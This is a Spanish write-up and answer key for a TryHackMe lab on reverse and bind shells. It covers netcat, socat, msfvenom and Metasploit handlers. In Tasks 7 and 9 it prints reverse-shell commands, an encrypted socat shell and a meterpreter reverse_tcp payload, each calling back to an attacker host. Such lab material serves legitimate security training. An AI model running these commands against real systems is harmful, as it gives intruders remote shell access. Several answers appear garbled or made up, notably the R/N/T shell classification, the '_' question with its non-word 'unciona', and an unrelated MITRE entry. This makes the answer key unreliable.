# What the Shell: An Introduction to Web Shells

| **Dificultad** | Easy |
| **Tipo** | Sala práctica (red shells) |
| **Slug** | `introtoshells` |
| **Link** | [TryHackMe](https://tryhackme.com/room/introtoshells) |
| **Sección** | 01 Level Easy |
| **Fuente** | TryHackMe |
| **Componentes** | netcat / socat / msfvenom / Metasploit handlers / reverse shell / bind shell / stager / TTY pty / mkfifo / OPENSSL |
| **Impacto** | Sala que enseña a generar y manejar shells: diferencias entre reverse (R), bind (N) y shell en túnel (T), stagers con netcat (`nc -lvnp <port>` para escuchar y `nc 10.10.10.11 8080` para conectar), estabilización y TTY (`stty cols 238`, `python3 -m http.server`), socat (con y sin cifrado OPENSSL), named pipes con `mkfifo` y primeros pasos con msfvenom/Metasploit (payload meterpreter, `exploit -j` y `sessions 10`). |

---

**Contexto:** La sala desglosa los distintos tipos de shells: **Reverse shell** (R): la víctima se conecta a nosotros; **Bind shell** (N): nosotros nos conectamos al puerto abierto por la víctima; **Túnel**: shell transportada por un canal intermedio. Con netcat se practica el stager clásico: escuchar con `nc -lvnp <port>` y conectar desde la víctima con `nc 10.10.10.11 8080`. Para shell cómoda se redimensiona el terminal (`stty cols 238`) y se sirven archivos con `python3`. Con socat se usan sockets TCP (`TCP-L:8080`) y shells cifradas con OPENSSL (`OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0` y el conector `OPENSSL:10.10.10.5:53,verify=0`). También se repasan los named pipes (`mkfifo`) y la generación de payloads con msfvenom (`msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443`), montando el handler en Metasploit con `exploit -j` e interactuando con `sessions 10`.

## Solucionario

### Task 1: Introducción

**Explicación:** Presenta los conceptos generales de shells y los distintos tipos que se verán en la sala.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee la introducción de la sala. | `No answer needed` |

### Task 2: Herramientas

**Explicación:** Revisa las herramientas básicas: netcat, socat y los payloads.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee el resumen de las herramientas a usar. | `No answer needed` |

### Task 3: Tipos de Shell

**Explicación:** Clasificación de shells: **R** (reverse shell, la víctima se conecta a nosotros), **N** (bind shell, nos conectamos al puerto abierto en la víctima) y **T** (shell en un túnel cifrado/encapsulado).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué tipo de shell inicia la conexión desde la víctima hacia el atacante? | `R` |
| 2 | ¿Qué tipo de shell escucha en un puerto de la víctima esperando nuestra conexión? | `N` |
| 3 | ¿Qué tipo de shell viaja dentro de un túnel entre ambos hosts? | `T` |

### Task 4: Netcat - Stagers

**Explicación:** Con netcat se montan stagers básicos: la máquina atacante escucha con `-l` y la víctima envía la shell con un comando como `nc 10.10.10.11 8080`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué switch usa netcat para ponerse a la escucha? | `-l` |
| 2 | ¿Qué comando envía la reverse shell desde la víctima hacia la máquina atacante en el puerto 8080? | `nc 10.10.10.11 8080` |

### Task 5: Netcat - Shells

**Explicación:** Una vez con la shell, se soluciona el problema del terminal "malo" (tab/backspace) redimensionando la TTY con `stty cols 238`, y para transferir archivos se levanta un servidor HTTP con `sudo python3 -m http.server 80`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué comando arregla el terminal redimensionando el número de columnas? | `stty cols 238` |
| 2 | ¿Qué comando levanta un servidor HTTP en el puerto 80 para transferir archivos? | `sudo python3 -m http.server 80` |

### Task 6: Socat

**Explicación:** Socat permite escuchar en sockets TCP de forma alternativa. El listado con tipo `TCP-L` y puerto releva al `-lvnp` de netcat.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Cómo se escucha un puerto con socat usando el tipo TCP-L? | `TCP-L:8080` |

### Task 7: Socat - Shells cifradas

**Explicación:** Con certificados OPENSSL se hace una shell cifrada: el listener usa `OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0` con TTY y `FILE:`tty``, y la víctima se conecta con `OPENSSL:10.10.10.5:53,verify=0` ejecutando `bash -li` con pty/stderr.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué comando socat usa la víctima para conectarse de vuelta con shell cifrada? | `socat OPENSSL:10.10.10.5:53,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane` |
| 2 | ¿Qué comando socat usa el atacante para escuchar con TTY y el certificado generado? | `socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0` |

### Task 8: Shells sencillas

**Explicación:** Shell entrante mediante named pipes (FIFO) con `mkfifo`: se crea el pipe, se vuelca la salida de `/bin/sh` dentro y se pasa el contenido a netcat.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué comando crea un named pipe (FIFO)? | `mkfifo` |
| 2 | Monta y prueba la shell con named pipes. | `No answer needed` |

### Task 9: Msfvenom

**Explicación:** Msfvenom genera el payload binario; el nombre del ejecutable se compacta con `_` y se especifica formato, salida, LHOST y LPORT: `msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443`.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Genera el payload con msfvenom. | `No answer needed` |
| 2 | ¿Qué carácter compacta/unciona el nombre del payload generado? | `_` |
| 3 | ¿Cuál es el comando msfvenom completo del payload meterpreter reverse_tcp en formato ELF con LHOST 10.10.10.5 y LPORT 443? | `msfvenom -p linux/x64/meterpreter/reverse_tcp -f elf -o shell LHOST=10.10.10.5 LPORT=443` |

### Task 10: Metasploit - Multi/Handler

**Explicación:** En Metasploit se monta el handler: `exploit -j` lanza el listener en segundo plano y `sessions 10` interactúa con la sesión número 10.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | ¿Qué comando lanza el handler de Metasploit en segundo plano? | `exploit -j` |
| 2 | ¿Qué comando interactúa con la sesión número 10? | `sessions 10` |

### Task 11: Estabilización de Shell

**Explicación:** Técnicas para estabilizar shells en Linux (uso de Python, TTY).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee las técnicas de estabilización de la shell. | `No answer needed` |

### Task 12: El efecto de la estabilización

**Explicación:** Repaso del comportamiento de una shell estabilizada (control de jobs, TTY completa).

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee el apartado sobre el efecto de la estabilización. | `No answer needed` |

### Task 13: Payloads de Shell Comunes

**Explicación:** Lista de payloads habituales (netcat, python, bash) para distintos formatos y triggers; ejecución práctica de los 10 ítems del laboratorio.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Practica los payloads habituales (10 ítems del laboratorio). | `No answer needed` |

### Task 14: Conclusiones

**Explicación:** Resumen final sobre cómo elegir y estabilizar la shell correcta según el escenario.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Lee las conclusiones de la sala. | `No answer needed` |

### Task 15: Fin

**Explicación:** Cierre de la sala; se recomienda completar los ejercicios adicionales.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | He terminado la sala. | `No answer needed` |

---

**Metodología:** repaso de tipos de shell (R/N/T) → stagers y binds con netcat → estabilización de TTY y transferencia de archivos → variante socat (plana y OPENSSL) → named pipes → generación de payload con msfvenom → handler en Metasploit (múltiple) → estabilización y payloads comunes.
**Learning chain:** tipos de shells → netcat (reverse/bind) → TTY y HTTP transfer → socat simple y cifrado → mkfifo → msfvenom/Metasploit → estabilización y payloads.
**MITRE ATT&CK:** T1059.004 (Unix Shell), T1059.006 (Python), T1105 (Ingress Tool Transfer), T1071.001 (Application Layer Protocol: Web), T1040 (Network Sniffing)
**Fuente:** [TryHackMe - What the Shell: An Introduction to Web Shells](https://tryhackme.com/room/introtoshells)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
